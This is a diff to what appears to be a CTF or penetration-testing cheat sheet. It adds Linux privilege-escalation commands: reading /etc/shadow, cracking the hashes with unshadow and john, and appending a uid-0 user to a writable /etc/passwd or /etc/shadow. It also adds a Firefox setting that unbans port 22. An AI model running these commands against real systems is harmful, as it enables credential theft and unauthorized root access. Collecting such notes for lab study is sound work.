@@ -62,6 +62,26 @@ getcap -r / 2>/dev/null
 find /  -perm -04000 -ls 2>/dev/null
 find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
 ```
+## Weak File Permissions ✅
+```bash
+cat /etc/shadow
+unshadow /etc/passwd /etc/shadow > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+### Writable /etc/shadow OR  /etc/passwd ✡️
+```bash
+mkpasswd -m sha-512 <new-password>
+OR
+openssl passwd <password>
+OR
+openssl passwd -1 -salt <username> <password>
+
+change root password from /etc/<shadow|passwd> OR Add to end the /etc/<shadow|passwd>
+
+Format add = <username>:<passwordhash>:0:0:root:/root:/bin/bash
+su <username> ( Switch to new root user )
+```
+
 # service ✅📚
 ## SMB ✅
 ```bash
@@ -106,7 +126,7 @@ gpg --batch --yes --passphrase 'passphrase' <file.gpg|pgp>
 sudo tshark -i any -f "icmp"
 sudo tcpdump ip proto \\icmp -i tun0
 ```
-# Extract 
+# Extract ✅
 ```bash
 tar -xf archive.tar
 gzip -d file.gz
@@ -124,6 +144,12 @@ git checkout <commit|branch ID>
 git merge <branch or commit name>
 git branch -a
 ```
+# how to use port 22 in firefox
+example = http://hogwartz.com:22
+enter "about:config"
+search "network.security.ports.banned.override"
+Select on "strings"  and [+] 
+write "port22"
 # Machine Tricks ✅📚
 ## flag_finder ✅
 ```bash
